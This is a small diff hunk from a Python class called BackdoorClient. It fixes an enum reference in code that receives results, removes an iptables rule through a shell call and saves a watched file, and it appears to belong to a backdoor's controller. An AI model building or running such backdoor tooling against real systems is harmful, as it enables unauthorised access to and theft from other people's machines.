@@ -530,7 +530,7 @@ class BackdoorClient(object):
             result = self.recv_result()
             subprocess.call("iptables -D {}".format(iptables_rule), shell=True)
 
-            if result.type == command.WATCH and not result.err:
+            if result.type == command.Command.WATCH and not result.err:
                 path, filename = os.path.split(result.path)
                 with open(filename, 'w') as out:
                     try:
